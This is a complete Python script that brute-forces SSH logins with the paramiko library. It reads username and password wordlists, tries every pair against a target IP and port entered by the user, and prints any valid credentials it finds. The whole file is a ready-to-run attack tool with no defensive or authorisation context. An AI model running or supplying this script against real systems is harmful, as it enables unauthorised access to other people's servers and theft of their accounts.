import paramiko
import sys
import os

def ssh_bruteforce(target_ip, target_port, username_file, password_file):
    with open(username_file, 'r') as f:
        usernames = f.read().splitlines()
    
    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()
    
    for username in usernames:
        for password in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target_ip, port=target_port, username=username, password=password)
                print(f"[+] Valid credentials found: {username}:{password}")
                ssh.close()
                return
            except paramiko.ssh_exception.AuthenticationException:
                print(f"[-] Invalid credentials: {username}:{password}")
            except paramiko.ssh_exception.SSHException:
                print(f"[-] Failed to connect to {target_ip}:{target_port}")
                return

    print("[-] No valid credentials found.")

if __name__ == '__main__':
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    username_file = input("Enter the path to the username wordlist: ")
    password_file = input("Enter the path to the password wordlist: ")

    if not os.path.isfile(username_file) or not os.path.isfile(password_file):
        print("[-] Username or password wordlist file not found.")
        sys.exit(1)

    ssh_bruteforce(target_ip, target_port, username_file, password_file)